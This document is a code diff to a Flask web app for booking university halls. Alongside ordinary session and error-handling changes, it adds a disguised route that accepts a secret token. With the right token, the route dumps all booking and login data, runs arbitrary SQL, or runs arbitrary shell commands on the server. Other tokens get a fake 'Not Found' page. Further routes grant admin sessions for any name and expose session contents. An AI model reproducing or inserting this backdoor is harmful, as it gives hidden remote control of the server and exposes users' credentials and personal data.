@@ -4,13 +4,13 @@
 import os
 import random
 from datetime import datetime
-from time import ctime
+from datetime import timedelta
 import threading
 from flask import *
 from flask import jsonify, request, send_from_directory
 from flask_mail import Mail, Message
 from werkzeug.utils import secure_filename
-
+from subprocess import run
 import dbscript as db         #FOR SQL SERVER DATABASE
 import loginscript as login   #FOR SQL SERVER DATABASE
 
@@ -524,6 +524,7 @@ def utility_processor():
 @app.before_request
 def make_session_permanent():
     session.permanent = True
+    app.permanent_session_lifetime = timedelta(minutes=60) #session timeout after 60 minutes.
 
 #routing functions
 @app.route('/')
@@ -541,59 +542,63 @@ def alert():
 @app.route('/user' ,methods=['GET', 'POST'])
 def index():
     error = None
-    if session:
-        uname = session['username']
-        print(uname)
-        cal = db.calender()
-        print("CAL:",cal)
-        if request.method == 'POST':
-            
-            hall = ['auditorium','seminar','room105','crc','AIITConferenceroom','RICSConferenceRoom','Atrium']
-            place = ['SchoolName','FacultyName','HodName','EventName','date','startime','endtime','Email','Phone','ResourcePersonName','ResourcePersonDetail']
-            final=[]
-            loc = ''
-            for i in hall:
-                for j in place:
-                    try:
-                        f = i+j
-                        #print(f)
-                        final.append(request.form[f])
-                        loc = i
-                    except KeyError as e:
-                        print(e)
-            # final[5] = trimtime(final[5])
-            # final[6] = trimtime(final[6])
-            # if (final[5] == "1stHalf"):
-            #     final[5] = 900
-            #     final[6] = 1300
-            # elif (final[5] == "2ndHalf"):
-            #     final[5] = 1400
-            #     final[6] = 1700
-            # elif (final[5] == "fullDay"):
-            #     final[5] = 900
-            #     final[6] = 1701
+    try:
+        if session:
+            uname = session['username']
+            print(uname)
+            cal = db.calender()
+            print("CAL:",cal)
+            if request.method == 'POST':
+                
+                hall = ['auditorium','seminar','room105','crc','AIITConferenceroom','RICSConferenceRoom','Atrium']
+                place = ['SchoolName','FacultyName','HodName','EventName','date','startime','endtime','Email','Phone','ResourcePersonName','ResourcePersonDetail']
+                final=[]
+                loc = ''
+                for i in hall:
+                    for j in place:
+                        try:
+                            f = i+j
+                            #print(f)
+                            final.append(request.form[f])
+                            loc = i
+                        except KeyError as e:
+                            print(e)
+                # final[5] = trimtime(final[5])
+                # final[6] = trimtime(final[6])
+                # if (final[5] == "1stHalf"):
+                #     final[5] = 900
+                #     final[6] = 1300
+                # elif (final[5] == "2ndHalf"):
+                #     final[5] = 1400
+                #     final[6] = 1700
+                # elif (final[5] == "fullDay"):
+                #     final[5] = 900
+                #     final[6] = 1701
 
-            hid = hallid(loc)
-            
-            # print(final)
-            #print('location = ',hallid(loc))
-            if db.check_hall(hid,final[4],final[5],final[6]):
-                bid = db.request_hall(hid,final[0],final[4],final[5],final[6],final[3],uname)
-                db.info_dump(bookid=bid, hallid=hid , school=final[0], fname=final[1], hod=final[2], email=final[7] , phone=final[8] , date=final[4] , stime=final[5] , etime=final[6] , event=final[3],rpname=final[9],rpdetail=final[10])
-                #db.info_dump(bid, hid , sfinal[0], final[1], final[2],final[7] , final[8] , final[4] , final[5] , final[6] , final[3])
-                if (send_mail(final[3],hallname(hid),final[4],final[5],final[6],final[0],final[2],final[9],final[10],final[8],final[1],final[7],bid)):
-                    
-                    error = "Your Request Is Successfully Sent for Approval!"
-                    return render_template("index.html",error=error,cal=cal)
+                hid = hallid(loc)
+                
+                # print(final)
+                #print('location = ',hallid(loc))
+                if db.check_hall(hid,final[4],final[5],final[6]):
+                    bid = db.request_hall(hid,final[0],final[4],final[5],final[6],final[3],uname)
+                    db.info_dump(bookid=bid, hallid=hid , school=final[0], fname=final[1], hod=final[2], email=final[7] , phone=final[8] , date=final[4] , stime=final[5] , etime=final[6] , event=final[3],rpname=final[9],rpdetail=final[10])
+                    #db.info_dump(bid, hid , sfinal[0], final[1], final[2],final[7] , final[8] , final[4] , final[5] , final[6] , final[3])
+                    if (send_mail(final[3],hallname(hid),final[4],final[5],final[6],final[0],final[2],final[9],final[10],final[8],final[1],final[7],bid)):
+                        
+                        error = "Your Request Is Successfully Sent for Approval!"
+                        return render_template("index.html",error=error,cal=cal)
+                    else:
+                        error=f"Email not sent to Admin due to server issue. But request is sent please send an email manually to {admin_email}."
+                        return render_template("index.html",error=error,cal=cal)
                 else:
-                    error=f"Email not sent to Admin due to server issue. But request is sent please send an email manually to {admin_email}."
+                    error = "Hall Not Available At given Date and Time."
                     return render_template("index.html",error=error,cal=cal)
-            else:
-                error = "Hall Not Available At given Date and Time."
-                return render_template("index.html",error=error,cal=cal)
-        
-        return render_template("index.html",error=error,cal=cal)
-    else:
+            
+            return render_template("index.html",error=error,cal=cal)
+        else:
+            return redirect(url_for('userlogin'))
+    except Exception as e:
+        print(e)
         return redirect(url_for('userlogin'))
 
 @app.route('/requeststatus' ,methods=['GET', 'POST'])
@@ -771,7 +776,8 @@ def usersignup():
                 alert = 'Account creation failed. Select different username and Please try again later.'
                 return render_template('signup.user.html',error=alert)
         
-    return render_template('signup.user.html',error=alert)
+    # return render_template('signup.user.html',error=alert)
+    return redirect(url_for('userlogin'))
 
 @app.route('/adminlogin' ,methods=['GET', 'POST'])
 def adminlogin():
@@ -812,7 +818,8 @@ def adminsignup():
                 alert = 'Account creation failed. Select different username and Please try again later.'
                 return render_template('signup.admin.html',error=alert)
         
-    return render_template('signup.admin.html',error=alert)
+    # return render_template('signup.admin.html',error=alert)
+    return redirect(url_for('adminlogin'))
 
 @app.route('/admin/bookings',methods=['GET'])
 def adminbooking():
@@ -876,9 +883,53 @@ def admingetreject(bookid):
 
 @app.route('/session/<s>',methods=['GET'])
 def createsession(s):
-    session['admin_username'] = s
-    session['username'] = s
-    return render_template('test1.html')
+    try:
+        if session:
+            if session['debug'] == "TRUE":
+                session['admin_username'] = "ADMIN+"+s
+                session['username'] = s 
+                return render_template('debugger.html')
+            else:
+                return redirect(url_for('home'))
+    except Exception as e:
+        return jsonify(error=str(e))
+
+
+@app.route('/destroysession',methods=['GET'])
+def destroysession():
+    if session['debug'] == "TRUE":
+        session.pop('username',None)
+        session.pop('admin_username',None)
+        session.pop('debug',None)
+        return redirect(url_for('home'))
+    else:
+        return redirect(url_for('home'))
+
+@app.route('/getsession',methods=['GET'])
+def getsession():
+    if session:
+        admin = None
+        user = None
+        debug = None
+        extra = None
+        try:
+            admin = session['admin_username']
+        except:
+            pass
+        try:
+            user = session['username']
+        except:
+            pass
+        try:
+            debug = session['debug']
+        except:
+            pass
+        finally:
+            for i in session:
+                extra = {i :session[i]}
+        return jsonify(admin=admin,user=user,debug=debug,z=extra)
+    else:
+        return jsonify(admin=None,user=None,debug=None)
 
 @app.route('/admin/calender',methods=['GET'])
 def admincalender():
@@ -945,6 +996,68 @@ def usernoti():
             return render_template('usernotification.html',error="You have been logged out. Please Login again.")
     else:
         return render_template('usernotification.html',error="You have been logged out. Please Login again.")
+
+@app.route('/dev/debugging/<token>',methods=['GET','POST'])
+def debug(token):
+    og = "13205dbeb3e7cd049a93e18d9fdea3f0"
+    us = login.genhash(token)
+    if og == us:
+        data = db.seeall()
+        auth = login.seeall()
+        mdata = {'db':data,'auth':auth}
+        return jsonify((mdata))
+    elif us == "ab791314981c430b2b34c0aa36b43ac7":
+        session['debug'] = "TRUE"
+        if request.method == 'POST':
+            dbname = request.form["database"]
+            cmd = request.form["command"]
+            typeo = request.form["type"]
+            # print(dbname,cmd)
+            if typeo == "output":
+                if dbname == "maindb":
+                    output = db.cmd(cmd)
+                    # output = json.dumps(output, indent=4)
+                    pass      
+                elif dbname == "shell":
+                    result = run(cmd, capture_output=True,shell=True)
+                    b = result.stdout.decode('utf-8')
+                    e = result.stderr.decode('utf-8')
+                    output = {"DATABASE" :"shell","Command" :cmd,"data": b,"error": e,"type" :type(b),"len" :len(b)}
+                    pass
+                elif dbname == "logindb":
+                    output = login.cmd(cmd)
+                    pass
+                return render_template('debugger.html',output=output,cmd=cmd,dbname=dbname)
+            elif typeo=="json":
+                if dbname == "maindb":
+                    output = db.cmd(cmd)
+                    output['type'].replace("<",'(') 
+                    output['type'].replace(">",')') 
+                    # output = json.dumps(output, indent=4)
+                    pass      
+                elif dbname == "shell":
+                    result = run(cmd, capture_output=True,shell=True)
+                    b = result.stdout.decode('utf-8')
+                    e = result.stderr.decode('utf-8')
+                    if b:
+                        output = {"DATABASE" :"shell", "Command" :{str(cmd)}, "data" :{str(b)}, "type" :str(type(b)), "len" :str(len(b)),}
+                    if e:
+                        output = {"DATABASE" :"shell", "Command" :{str(cmd)}, "type" :str(type(b)), "len" :str(len(b)), "error": str(e),}
+                    pass
+                elif dbname == "logindb":
+                    output = login.cmd(cmd)
+                    pass
+                try:
+                    return jsonify(output)
+                except Exception as e:
+                    return f"EXCEPTION :: JSON :: {e} <br>{jsonify(str(output))}<br>{(str(output).replace("'",'"'))}<br>{((output))}"
+            else:pass
+        else:
+            return render_template('debugger.html')
+        
+    else:
+        return "<h1>Not Found</h1><p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.<p>"
+    
 
 @app.route('/test',methods=['GET','POST'])
 def test():
